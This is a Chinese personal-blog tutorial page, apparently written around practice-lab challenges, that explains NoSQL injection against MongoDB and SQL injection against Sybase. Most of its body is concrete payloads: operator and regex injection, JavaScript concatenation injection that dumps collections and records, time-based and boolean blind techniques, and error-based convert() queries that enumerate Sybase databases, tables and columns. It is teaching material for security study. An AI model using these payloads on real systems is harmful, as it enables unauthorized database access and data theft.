@@ -1,0 +1,431 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="不同数据库的注入方法(MongoDB、Sybase)" />
+
+
+<meta name="description" content="本篇开始进行对MongoDB,Sybase数据库的注入研究。
+
+MongoDB数据库题目地址：https://www.mozhe.cn/bug/detail/YXlRYUJPYk1vQjAreH..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    不同数据库的注入方法(MongoDB、Sybase) |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="不同数据库的注入方法(MongoDB、Sybase)">
+            
+            不同数据库的注入方法(MongoDB、Sybase)
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95-MongoDB%E3%80%81Sybase/" rel="tag">不同数据库的注入方法(MongoDB、Sybase)</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/04/11</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                335</strong>
+            天之前发表，文中内容可能已经过时。
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>本篇开始进行对MongoDB,Sybase数据库的注入研究。</p>
+<a id="more"></a>
+<h1 id="MongoDB数据库"><a href="#MongoDB数据库" class="headerlink" title="MongoDB数据库"></a>MongoDB数据库</h1><p>题目地址：<br><a href="https://www.mozhe.cn/bug/detail/YXlRYUJPYk1vQjAreHlweVAyMzVTUT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/YXlRYUJPYk1vQjAreHlweVAyMzVTUT09bW96aGUmozhe</a></p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>MongoDB的数据传输是通过jsonp格式来传递的。</p>
+<ol>
+<li>db.test.save();        增</li>
+<li>db.test.remove();    删</li>
+<li>db.test.update();    改</li>
+<li>db.test.find();        查</li>
+</ol>
+<p>其中，db是固定的前缀，test是某个数据库名字。MongoDB是一种非关系型的数据库，因此查询、操作语句与SQl语句不同。<br>数据库中保存的记录：</p>
+<pre><code>{
+    name: &quot;ggy&quot;,
+    info:{
+        age:19
+    }
+}</code></pre><p>想要更新这条记录，需要执行下列语句：</p>
+<pre><code>db.test.update({&quot;name&quot;:&quot;ggy&quot;},{&quot;$set&quot;:{&quot;info.age&quot;:66}})</code></pre><p>都是基于JSON格式的数据进行操作。还有一个excute,就是直接执行字符串的。</p>
+<h2 id="操作符介绍"><a href="#操作符介绍" class="headerlink" title="操作符介绍"></a>操作符介绍</h2><pre><code>$lt -&gt; &lt;; $lte -&gt; &lt;=; $gt -&gt; &gt;; $gte -&gt; &gt;=; $ne -&gt; !=
+$regex</code></pre><p>运用：</p>
+<pre><code>db.test.find({&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:{$ne:&quot;1&quot;}})</code></pre><p>查询name为admin,password不为1的数据，相当于：</p>
+<pre><code>select * from test where name=&apos;admin&apos; and password !=1</code></pre><p>因此可以通过更改$ne来进行类似的操作。运用regex:</p>
+<pre><code>db.test.find({&quot;name&quot;:{&apos;regex&apos;:&quot;^a&quot;}})</code></pre><p>匹配以a开头的数据。</p>
+<h2 id="数组攻击（数字型）"><a href="#数组攻击（数字型）" class="headerlink" title="数组攻击（数字型）"></a>数组攻击（数字型）</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>从上面的JSON数据可以看出，这个其实跟python的字典一样，不过在这里是相当于数组，键相当于下标，从而可以根据相应下标查询到值。比如：</p>
+<pre><code>db.test.find({username:&quot;test&quot;,password:&quot;test&quot;})</code></pre><p>按照上面的说法，就是根据username,password这些下标查询到对应的值，类似于SQL语句：</p>
+<pre><code>?username=test&amp;password=test</code></pre><p>test这个用户是我们随意编的，肯定不能成功登录。我们从上面<code>{$ne:&quot;1&quot;}</code>知道，可以通过这样来查询出不为1的数据。而要想将这个$ne插进去，就需要用到数组了。比如：</p>
+<pre><code>?username[$ne]=test&amp;password[$ne]=test</code></pre><p>后台查询语句为：</p>
+<pre><code>db.test.find({username:{&apos;$ne&apos;:&apos;test&apos;},password:&apos;test&apos;})</code></pre><p>相当于SQL语句：</p>
+<pre><code>?username!=test&amp;password!=test</code></pre><p>这样直接查询出其它用户。（前提有回显）</p>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>没有回显就不知道爆出来的其它用户名和密码是什么，因此需要使用regexp一个个匹配。</p>
+<pre><code>?username[$regex]=^a
+db.test.find({username:{&apos;$regex&apos;:&apos;^a&apos;}})</code></pre><p>题目writeup:<br><a href="https://www.secpulse.com/archives/1916.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/1916.html</a></p>
+<h2 id="拼接字符串时的注入（字符型）"><a href="#拼接字符串时的注入（字符型）" class="headerlink" title="拼接字符串时的注入（字符型）"></a>拼接字符串时的注入（字符型）</h2><pre><code>?username=test&apos;}};return {username:1,password:2}//&amp;password=test</code></pre><p>应该返回：username:1 password:2</p>
+<h3 id="爆所有集合名"><a href="#爆所有集合名" class="headerlink" title="爆所有集合名"></a>爆所有集合名</h3><pre><code>?username=test&apos;});return {username:tojson(db.getCollectionNames()),password:2};//&amp;password=test</code></pre><p>db.getCollectionNames()返回的是数组，因此需要tojson。<br>爆某个集合的第一条数据 </p>
+<pre><code>test&apos;});return {username:tojson(db.test.find()[0]),password:2};//&amp;password=test</code></pre><p>第二条：</p>
+<pre><code>test&apos;});return {username:tojson(db.test.find()[1]),password:2};//&amp;password=test</code></pre><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><pre><code>test&apos;});if (db.version() &gt; &quot;0&quot;) { sleep(10000); exit; }var b=({a:&apos;1&amp;password=test</code></pre><p>拼接闭合方式，注释用不了。</p>
+<h2 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h2><p>首先加单引号，报错，然后使用：</p>
+<pre><code>?news=test&apos;%26%26&apos;1&apos;==&apos;1  （正常）
+?news=test&apos;%26%26&apos;1&apos;==&apos;1  （错误）</code></pre><p>因此是字符型。</p>
+<h3 id="爆集合数"><a href="#爆集合数" class="headerlink" title="爆集合数"></a>爆集合数</h3><pre><code>?news=test&apos;%26%26db.getCollectionNames().length&gt;0%26%26&apos;1&apos;==&apos;1</code></pre><p>同样是二分法判断出集合数。接着爆集合名称：<br>爆第一个集合名称的长度：</p>
+<pre><code>?news=test&apos;%26%26db.getCollectionNames()[0].length&gt;1%26%26&apos;1&apos;==&apos;1</code></pre><p>爆第一个集合名称的第一个字符：</p>
+<pre><code>?news=test&apos;%26%26db.getCollectionNames()[0][0]&gt;&apos;a&apos;%26%26&apos;1&apos;==&apos;1</code></pre><p>最终得到一个集合名称叫:user<br>爆集合中的第一条数据： </p>
+<pre><code>?news=test&apos;%26%26tojson(db.user.find()[0])[0]==&apos;{&apos;%26%26&apos;1&apos;==&apos;1</code></pre><p>爆出来第一条数据的第一个字符。</p>
+<pre><code>?news=test&apos;%26%26tojson(db.user.find()[0])[1]==&apos;{&apos;%26%26&apos;1&apos;==&apos;1</code></pre><p>爆出来第一条数据的第二个字符…</p>
+<h2 id="挖掘方法"><a href="#挖掘方法" class="headerlink" title="挖掘方法"></a>挖掘方法</h2><p>题目地址：<br><a href="https://www.mozhe.cn/bug/detail/YXlRYUJPYk1vQjAreHlweVAyMzVTUT09bW96aGUmozhe" target="_blank" rel="noopener">https://www.mozhe.cn/bug/detail/YXlRYUJPYk1vQjAreHlweVAyMzVTUT09bW96aGUmozhe</a></p>
+<h3 id="探测注入点"><a href="#探测注入点" class="headerlink" title="探测注入点"></a>探测注入点</h3><p>加单引号回显错误，注释也注释不掉，以为是数字型，发现and 1=1仍然没有正常回显，说明其实还是字符型，或者and和空格被过滤了，不过假设是字符型，注释不了就闭合。如果此时知道是MongoDB数据库，那么在正常页面下F12查看有哪些标签与输出在页面的内容相关。发现有两个div,一个class=”title”,另一个是class=”content”。那么就可以慢慢构造闭合语句。由于是json格式的数据，很可能就是’})或者直接’}，那么可以尝试：</p>
+<pre><code>?id=1&apos;};return {&apos;title&apos;:tojson(db),2:&apos;1
+?id=1&apos;});return ({&apos;title&apos;:tojson(db),2:&apos;1</code></pre><p>有回显的情况下，返回一个数据库名。</p>
+<h3 id="爆所有集合名-1"><a href="#爆所有集合名-1" class="headerlink" title="爆所有集合名"></a>爆所有集合名</h3><pre><code>?id=1&apos;});return ({title:tojson(db.getCollectionNames()),2:&apos;1</code></pre><p>注意，MongoDB区分大小写。</p>
+<h3 id="爆某集合的第一条数据"><a href="#爆某集合的第一条数据" class="headerlink" title="爆某集合的第一条数据"></a>爆某集合的第一条数据</h3><pre><code>?id=1&apos;});return ({title:tojson(db.Authority_confidential.find()[0]),2:&apos;1</code></pre><p>爆第二条：</p>
+<pre><code>?id=1&apos;});return ({title:tojson(db.Authority_confidential.find()[1]),2:&apos;1</code></pre><h1 id="Sybase数据库"><a href="#Sybase数据库" class="headerlink" title="Sybase数据库"></a>Sybase数据库</h1><p>Sybase是MSSQL的一个分支，注入方法和MSSQL类似（其实是因为在网上没找到相关文章…）支持union联合查询，having和where not in等语法，但不支持使用TOP，和不同类型的数据直接比较，如：and 1=user，需要使用convert,如：1=convert(integer,user)</p>
+<h2 id="判断是否是Sybase数据库"><a href="#判断是否是Sybase数据库" class="headerlink" title="判断是否是Sybase数据库"></a>判断是否是Sybase数据库</h2><pre><code>and exists(select * from master.dbo.ijdbc_function_escapes)</code></pre><h2 id="爆版本信息"><a href="#爆版本信息" class="headerlink" title="爆版本信息"></a>爆版本信息</h2><pre><code>and 1= convert(integer,(select @@version))
+?id=-1 union select 1,&quot;&quot;,(select @@version)</code></pre><h2 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h2><pre><code>id=1 and 1=convert(integer,(SELECT MIN(ISNULL(CONVERT(NVARCHAR(4000),gJyQ.name),CHAR(32))) FROM (SELECT name FROM master..sysdatabases) AS gJyQ WHERE CONVERT(NVARCHAR(4000),gJyQ.name)&gt;&apos; &apos;)) </code></pre><p>得到第一个库master。</p>
+<pre><code>id=1 and 1=convert(integer,(SELECT MIN(ISNULL(CONVERT(NVARCHAR(4000),gJyQ.name),CHAR(32))) FROM (SELECT name FROM master..sysdatabases) AS gJyQ WHERE CONVERT(NVARCHAR(4000),gJyQ.name)&gt;&apos;master&apos;))</code></pre><p>得到除master外的第一个库，其实类似not in(‘’)的功能。 还有另外一个办法爆库。</p>
+<pre><code>and 1=convert(integer,(SELECT name FROM master..sysdatabases where dbid=1))</code></pre><p>递增bdid的值即可。</p>
+<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><pre><code>and 1=convert(integer,(select MIN(ISNULL(CONVERT(NVARCHAR(4000),aaaa.name),CHAR(32))) from (select name from test.dbo.sysobjects where type=&apos;U&apos;) AS aaaa where CONVERT(NVARCHAR(4000),aaaa.name)&gt;&apos;&apos;))</code></pre><p>得到第一个表cmd, 列出除cmd外的第一个表：</p>
+<pre><code>and 1=convert(integer,(select MIN(ISNULL(CONVERT(NVARCHAR(4000),aaaa.name),CHAR(32))) from (select name from test.dbo.sysobjects where type=&apos;U&apos;) AS aaaa where CONVERT(NVARCHAR(4000),aaaa.name)&gt;&apos;cmd&apos;))     </code></pre><h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><pre><code>1=convert(integer,(select name from test..syscolumns where id=object_id(&apos;users&apos;) and colid=1))</code></pre><p>递增colid爆其它列名。</p>
+<h2 id="爆字段内容"><a href="#爆字段内容" class="headerlink" title="爆字段内容"></a>爆字段内容</h2><pre><code>1=convert(integer,( select 列名 from 表名 set rowcount 1))</code></pre><p>因为不支持select top 1 name from xxx（12.5以及之前的版本），使用set rowcount N代替。</p>
+<p>写文件、Sybase基础知识等其它操作看后面的参考文章。</p>
+<p>参考文章：<br>MongoDB数据库：<br><a href="https://www.cnblogs.com/alummox/p/9665592.html" target="_blank" rel="noopener">https://www.cnblogs.com/alummox/p/9665592.html</a><br><a href="https://www.secpulse.com/archives/3278.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/3278.html</a><br>Sybase数据库：<a href="http://www.vuln.cn/6514" target="_blank" rel="noopener">http://www.vuln.cn/6514</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/04/13/HTTP-Leak%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/" class="pre-post btn btn-default" title='HTTP Leak漏洞原理及利用'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            HTTP Leak漏洞原理及利用</span>
+    </a>
+    
+    
+    <a href="/2020/04/11/%E5%88%A4%E6%96%AD%E6%98%AF%E5%93%AA%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B/" class="next-post btn btn-default" title='判断是哪种数据库类型'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            判断是哪种数据库类型</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MongoDB数据库"><span class="toc-text">MongoDB数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#基础知识"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#操作符介绍"><span class="toc-text">操作符介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#数组攻击（数字型）"><span class="toc-text">数组攻击（数字型）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#有回显"><span class="toc-text">有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无回显"><span class="toc-text">无回显</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拼接字符串时的注入（字符型）"><span class="toc-text">拼接字符串时的注入（字符型）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爆所有集合名"><span class="toc-text">爆所有集合名</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#时间盲注"><span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#布尔型盲注"><span class="toc-text">布尔型盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#爆集合数"><span class="toc-text">爆集合数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#挖掘方法"><span class="toc-text">挖掘方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#探测注入点"><span class="toc-text">探测注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆所有集合名-1"><span class="toc-text">爆所有集合名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#爆某集合的第一条数据"><span class="toc-text">爆某集合的第一条数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Sybase数据库"><span class="toc-text">Sybase数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#判断是否是Sybase数据库"><span class="toc-text">判断是否是Sybase数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆版本信息"><span class="toc-text">爆版本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆数据库"><span class="toc-text">爆数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆表名"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆字段"><span class="toc-text">爆字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆字段内容"><span class="toc-text">爆字段内容</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
